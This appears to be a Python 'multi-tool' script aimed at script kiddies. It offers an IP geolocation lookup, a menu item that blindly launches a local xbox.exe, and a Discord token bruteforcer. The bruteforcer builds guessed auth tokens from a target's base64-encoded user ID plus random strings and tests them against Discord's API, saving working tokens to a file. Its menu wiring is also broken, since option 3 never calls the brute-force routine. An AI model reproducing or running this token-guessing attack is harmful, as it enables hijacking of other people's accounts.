import random
import os
import time
import getpass
import base64
import string
import requests
from colorama import Fore


class Main:

    @staticmethod
    def main():
        titles = ["Free multi-tool V1", "Free multi-tool", "Best tool in com."]
        os.system(f'title {random.choice(titles)}')

        print('Free Multi-Tool\n[1] IP-Lookup\n[2] Xbox Resolver\n[3] Discord Token Bruteforcer')
        option = input(f'[{getpass.getuser()}]@Skids: ')

        if option == "1":
            print(f'Please enter an IP Address\n')
            ip = input(f': ')
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={ip}")
            print(r.json())
            input("Press Enter to go back...")
            os.system('cls||clear')
            Main.main()

        if option == "2":
            os.system('start xbox.exe')
            os.system('cls||clear')
            Main.main()

        if option == "3":
            TokenBrute()


class TokenBrute:

    @staticmethod
    def tokenbrute():
        id_to_token = base64.b64encode(input("ID TO TOKEN --> ").encode("ascii"))
        id_to_token = str(id_to_token)[2:-1]

        while id_to_token == id_to_token:
            token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(
                random.choices(string.ascii_letters + string.digits, k=25))
            headers = {
                'Authorization': token
            }
            login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
            try:
                if login.status_code == 200:
                    print(Fore.GREEN + '[+] VALID' + ' ' + token)
                    with open('hit.txt', "a+") as f:
                        f.write(f'{token}\n')
                else:
                    print(Fore.RED + '[-] INVALID' + ' ' + token)
            finally:
                print("")


if __name__ == "__main__":
    Main.main()
